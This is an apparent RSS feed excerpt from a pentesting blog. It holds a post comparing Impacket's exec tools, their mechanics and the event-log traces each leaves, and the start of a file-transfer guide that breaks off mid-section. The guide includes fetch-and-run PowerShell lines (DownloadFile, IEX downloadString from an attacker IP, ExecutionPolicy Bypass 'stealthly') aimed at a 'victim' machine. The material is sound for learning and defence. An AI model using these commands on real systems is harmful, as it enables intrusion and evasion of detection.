&lt;li&gt;1 System Event IDs: 7045 (Service Started)&lt;/li&gt;
&lt;li&gt;12 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;smbexec--the-next-logicalstep&#34;&gt;SmbExec- the next logical step&lt;/h1&gt;
&lt;p&gt;SmbExec works similarly to PsExec. The main difference is that PsExec will upload a &lt;code&gt;.exe&lt;/code&gt; file to the &lt;code&gt;ADMIN$&lt;/code&gt; share while SmbExec uploads a &lt;code&gt;.bin&lt;/code&gt; file along with a temporary file.&lt;/p&gt;
&lt;p&gt;If you’re interested in learning how to replicate this manually, &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;HackTricks&lt;/a&gt; has a section demonstrating how to do so.&lt;/p&gt;
&lt;p&gt;Referencing the images from &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, we can see the log output for establishing a connection via SmbExec, executing one command, and exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*-KV26ONRuN8dlFWy.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*MsVaNUTQpbyjLkci.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The resulting logs are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4 System Event IDs: 7045 (Service Started), 7009 (Service Error — Timeout)&lt;/li&gt;
&lt;li&gt;3 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;wmiexec-psexec&#34;&gt;Wmiexec &amp;gt; Psexec?&lt;/h1&gt;
&lt;p&gt;WMIexec works via Windows Management Instrumentation (WMI). WMI works by negotiating a random port (&amp;gt;1024) with the client over an initial connection to RCP (135/TCP). WMI and RPC are commonly used for network administration, so it is common for the ports to be open and unfiltered on an internal network.&lt;/p&gt;
&lt;p&gt;The user sends input to the remote host over the random port. The input is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output is written to a file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. The filename starts with &lt;code&gt;__&lt;/code&gt;, followed by the timestamp.&lt;/p&gt;
&lt;p&gt;The advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance.&lt;/p&gt;
&lt;p&gt;In addition, you can utilize WMI for remote access via the program &lt;code&gt;pth-wmis&lt;/code&gt; which comes preinstalled with Kali Linux.&lt;/p&gt;
&lt;p&gt;Again, we can view the log output of a connection, executing a single command, and exiting as demonstrated by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*TzXqdM8qKIHbTsMN.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The result is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;14 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’re interested in learning more about WmiExec, &lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;this article&lt;/a&gt; goes into detail about how it works on a low level and how it is detected.&lt;/p&gt;
&lt;h1 id=&#34;atexec&#34;&gt;AtExec&lt;/h1&gt;
&lt;p&gt;This program works by remotely executing scheduled tasks on a remote target through RCP. It creates a scheduled task via the Task Schedule Service. The task is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output of the command (&lt;code&gt;STDERR&lt;/code&gt;and &lt;code&gt;STDERR&lt;/code&gt;) is written in a temporary file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. AtExec retrieves the value of this file before deleting it.&lt;/p&gt;
&lt;h1 id=&#34;dcomexec&#34;&gt;DcomExec&lt;/h1&gt;
&lt;p&gt;This program uses the &lt;a href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0&#34;&gt;Distributed Component Object Model (DCOM)&lt;/a&gt; protocol. DCOM is a protocol that relies heavily on RPC to help software components communicate on networked computers. It has the same user interface as PsExec, and works as explained &lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;here&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Dcomexec uses the MMC20 Application (which is accessible over the network with authentication) and its &lt;code&gt;ExecuteShellCommand&lt;/code&gt; method to execute arbitrary commands. It also supports using the ShellWindows application and the ShellBrowserWindow applications.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;tldr&#34;&gt;TLDR;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;PsExec works over SMB by uploading a &lt;code&gt;.exe&lt;/code&gt; file that creates a named pipe between you and the remote host&lt;/li&gt;
&lt;li&gt;SmbExec works similarly, except instead of a &lt;code&gt;.exe&lt;/code&gt; file, it uses a &lt;code&gt;.bin&lt;/code&gt; file.&lt;/li&gt;
&lt;li&gt;WmiExec uses the Windows Management Instrumentation service to sent input to the host and output is written to a file in SMB.&lt;/li&gt;
&lt;li&gt;AtExec works through executing scheduled tasks in SMB&lt;/li&gt;
&lt;li&gt;DcomExec uses the DCOM protocol with RPC to execute commands&lt;/li&gt;
&lt;li&gt;They all look different in logs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope you learned something because I certainly did.&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Attacking Windows: Performing Lateral Movement with Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.trustedsec.com/blog/no_psexec_needed/&#34;&gt;https://www.trustedsec.com/blog/no_psexec_needed/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;other-exec-tools-that-you-can-learn-moreabout&#34;&gt;Other “exec” tools that you can learn more about&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skorov/scexec&#34;&gt;ScExec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec&#34;&gt;MsiExec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*2pekupqLLWtBkgpl" alt=""  />

<em><a href="https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1">https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1</a></em></p>
<p>If you’re anything like me, you discovered <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.</p>
<h1 id="psexec">PsExec</h1>
<p>PsExec works by writing a randomly-named binary to the <code>ADMIN$</code> SMB share (hence why you require write access to that share in order to use it). The binary establishes a named pipe that is used by the SVCManager to create a new service. This named pipe can be used by the user to execute commands remotely. You can imagine the binary as executing the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>sc create [serviceName] binPath<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\Windows\[uploaded-binary].exe&#34;</span>
</span></span></code></pre></div><p>All of your command input and output occurs over the named pipe via SMB (445/TCP).</p>
<p>As pointed out by <a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Jeremy Dupuis</a>, PsExec leaves artifacts behind that require manual cleaning as the binary that is uploaded is not automatically removed. In fact, this is what the error logs look like after he ran a single command on PsExec before exiting.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*Pj8MeQykWNNX4Kr_.png" alt="Picture of an error log from this article: https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/"  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png">https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png</a></em></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*8jYiFbXMIpkEf-r1.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png">https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png</a></em></p>
<p>As you can see, the logs showed:</p>
<ul>
<li>1 System Event IDs: 7045 (Service Started)</li>
<li>12 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)</li>
</ul>
<h1 id="smbexec--the-next-logicalstep">SmbExec- the next logical step</h1>
<p>SmbExec works similarly to PsExec. The main difference is that PsExec will upload a <code>.exe</code> file to the <code>ADMIN$</code> share while SmbExec uploads a <code>.bin</code> file along with a temporary file.</p>
<p>If you’re interested in learning how to replicate this manually, <a href="https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec">HackTricks</a> has a section demonstrating how to do so.</p>
<p>Referencing the images from <a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Jeremy Dupuis</a>, we can see the log output for establishing a connection via SmbExec, executing one command, and exiting.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-KV26ONRuN8dlFWy.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png">https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png</a></em></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*MsVaNUTQpbyjLkci.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png">https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png</a></em></p>
<p>The resulting logs are:</p>
<ul>
<li>4 System Event IDs: 7045 (Service Started), 7009 (Service Error — Timeout)</li>
<li>3 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)</li>
</ul>
<h1 id="wmiexec-psexec">Wmiexec &gt; Psexec?</h1>
<p>WMIexec works via Windows Management Instrumentation (WMI). WMI works by negotiating a random port (&gt;1024) with the client over an initial connection to RCP (135/TCP). WMI and RPC are commonly used for network administration, so it is common for the ports to be open and unfiltered on an internal network.</p>
<p>The user sends input to the remote host over the random port. The input is executed with <code>cmd.exe</code> and the output is written to a file in the <code>ADMIN$</code> SMB share. The filename starts with <code>__</code>, followed by the timestamp.</p>
<p>The advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance.</p>
<p>In addition, you can utilize WMI for remote access via the program <code>pth-wmis</code> which comes preinstalled with Kali Linux.</p>
<p>Again, we can view the log output of a connection, executing a single command, and exiting as demonstrated by <a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Jeremy Dupuis</a>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*TzXqdM8qKIHbTsMN.png" alt=""  />

<em><a href="https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png">https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png</a></em></p>
<p>The result is:</p>
<ul>
<li>14 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)</li>
</ul>
<p>If you’re interested in learning more about WmiExec, <a href="https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/">this article</a> goes into detail about how it works on a low level and how it is detected.</p>
<h1 id="atexec">AtExec</h1>
<p>This program works by remotely executing scheduled tasks on a remote target through RCP. It creates a scheduled task via the Task Schedule Service. The task is executed with <code>cmd.exe</code> and the output of the command (<code>STDERR</code>and <code>STDERR</code>) is written in a temporary file in the <code>ADMIN$</code> SMB share. AtExec retrieves the value of this file before deleting it.</p>
<h1 id="dcomexec">DcomExec</h1>
<p>This program uses the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0">Distributed Component Object Model (DCOM)</a> protocol. DCOM is a protocol that relies heavily on RPC to help software components communicate on networked computers. It has the same user interface as PsExec, and works as explained <a href="https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d">here</a>:</p>
<blockquote>
<p>Dcomexec uses the MMC20 Application (which is accessible over the network with authentication) and its <code>ExecuteShellCommand</code> method to execute arbitrary commands. It also supports using the ShellWindows application and the ShellBrowserWindow applications.</p>
</blockquote>
<h1 id="tldr">TLDR;</h1>
<ul>
<li>PsExec works over SMB by uploading a <code>.exe</code> file that creates a named pipe between you and the remote host</li>
<li>SmbExec works similarly, except instead of a <code>.exe</code> file, it uses a <code>.bin</code> file.</li>
<li>WmiExec uses the Windows Management Instrumentation service to sent input to the host and output is written to a file in SMB.</li>
<li>AtExec works through executing scheduled tasks in SMB</li>
<li>DcomExec uses the DCOM protocol with RPC to execute commands</li>
<li>They all look different in logs</li>
</ul>
<p>I hope you learned something because I certainly did.</p>
<h1 id="references"><strong>References</strong></h1>
<ul>
<li><a href="https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/">Attacking Windows: Performing Lateral Movement with Impacket</a></li>
<li><a href="https://www.trustedsec.com/blog/no_psexec_needed/">https://www.trustedsec.com/blog/no_psexec_needed/</a></li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec">https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec</a></li>
<li><a href="https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/">https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/</a></li>
<li><a href="https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d">https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d</a></li>
</ul>
<h2 id="other-exec-tools-that-you-can-learn-moreabout">Other “exec” tools that you can learn more about</h2>
<ul>
<li><a href="https://github.com/skorov/scexec">ScExec</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec">MsiExec</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Pentester’s Guide to Performing File Transfers</title>
      <link>https://ally-petitt.github.io:443/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</link>
      <pubDate>Wed, 08 Jun 2022 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.github.io:443/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;foreword&#34;&gt;Foreword&lt;/h1&gt;
&lt;p&gt;To avoid detection, it is best to use tools that are native to the victim’s computer.&lt;/p&gt;
&lt;h1 id=&#34;ftp-with-windowshost&#34;&gt;FTP with Windows Host&lt;/h1&gt;
&lt;p&gt;While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install vsftpd  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo service vsftpd start  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service vsftpd status #status should be active
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To check if your server is working, type &lt;code&gt;ftp localhost.&lt;/code&gt; If you see the message “Connected to localhost”, your FTP server is running.&lt;/p&gt;
&lt;h2 id=&#34;accessing-file-with-interactive-shell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png&#34; alt=&#34;&#34;  /&gt;

Accessing File With Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you have an interactive shell on the Windows machine, run this command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cscript wget.vbs http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt; &amp;lt;FILENAME TO SAVE AS&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;accessing-file-with-non-interactive-shell&#34;&gt;Accessing File With Non-Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;storageDir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;pwd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output-file.exe&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DownloadFile(&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url,&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To invoke&lt;code&gt;wget.ps1&lt;/code&gt;, call&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IEX(New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;downloadString(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;getting-files-through-powershell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg&#34; alt=&#34;&#34;  /&gt;

Getting Files Through PowerShell&lt;/h1&gt;
&lt;p&gt;On your Kali Linux machine, make a copy of the file you want to send to &lt;code&gt;/var/www/html/&lt;/code&gt; . On the Window’s machine, execute the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.10.128/unko.txt&amp;#39;,&amp;#39;C:\Users\Administrator\Desktop&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ransferme.txt&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.119.146/gori.ps1&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-withsmb&#34;&gt;File Transfer With SMB&lt;/h1&gt;
&lt;h2 id=&#34;method-1&#34;&gt;Method 1&lt;/h2&gt;
&lt;p&gt;Get &lt;code&gt;smbserver.py&lt;/code&gt;from &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt; and run the following on your Kali Linux machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
